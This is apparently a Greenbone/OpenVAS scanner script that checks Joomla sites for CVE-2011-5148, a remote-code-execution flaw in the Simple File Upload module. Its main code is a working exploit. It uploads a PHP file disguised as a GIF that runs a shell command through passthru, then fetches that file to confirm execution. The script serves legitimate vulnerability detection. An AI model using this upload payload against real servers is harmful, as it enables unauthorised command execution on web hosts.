# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802560");
  script_version("2022-09-30T13:25:06+0000");
  script_cve_id("CVE-2011-5148");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-09-30 13:25:06 +0000 (Fri, 30 Sep 2022)");
  script_tag(name:"creation_date", value:"2012-01-06 20:03:12 +0530 (Fri, 06 Jan 2012)");
  script_name("Joomla Simple File Upload Module < 1.3.5 RCE Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47370/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51214");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18287/");

  script_tag(name:"summary", value:"Joomla Simple File Upload Module is prone to a remote code
  execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP POST and GET requests and checks
  the responses.");

  script_tag(name:"insight", value:"The flaw is due to the access and input validation errors in the
  'index.php' script when uploading files.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to upload PHP scripts
  and execute arbitrary commands on a web server.");

  script_tag(name:"affected", value:"Joomla Simple File Upload Module versions prior to 1.3.5.");

  script_tag(name:"solution", value:"Update to version 1.3.5 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

# nb: No http_get_cache() to grab a fresh value...
req = http_get(item:dir + "/index.php", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

ver = eregmatch(pattern:'" name="sfuFormFields([0-9]+)', string:res);
if(isnull(ver[1]))
  exit(0);

cmds = exploit_commands();
useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach pattern(keys(cmds)) {

  vt_strings = get_vt_strings();
  file = vt_strings["default_rand"] + ".php5";
  cmd = cmds[pattern];

  content = string("-----------------------------1933563624\r\n",
                   "Content-Disposition: form-data; name='sfuFormFields", ver[1], "'\r\n",
                   "\r\n",
                   "\r\n",
                   "-----------------------------1933563624\r\n",
                   "Content-Disposition: form-data; name='uploadedfile", ver[1], "[]'; filename='", file, "'\r\n",
                   "Content-Type: image/gif\r\n",
                   "\r\n",
                   "GIF8/*/*<?php passthru('", cmd, "')?>/*\n",
                   "\r\n",
                   "-----------------------------1933563624--\r\n");

  header = string("POST ", dir, "/index.php HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "User-Agent: ", useragent, "\r\n",
                  "Connection: Close\r\n",
                  "Content-Type: multipart/form-data; boundary=---------------------------1933563624\r\n",
                  "Content-Length: ", strlen(content), "\r\n\r\n");

  req = header + content;
  http_keepalive_send_recv(port:port, data:req);

  url = dir + "/images/" + file;
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && egrep(pattern:pattern, string:res)) {
    report = http_report_vuln_url(port:port, url:url);
    report += '\nNote: Please delete this uploaded test file.';
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
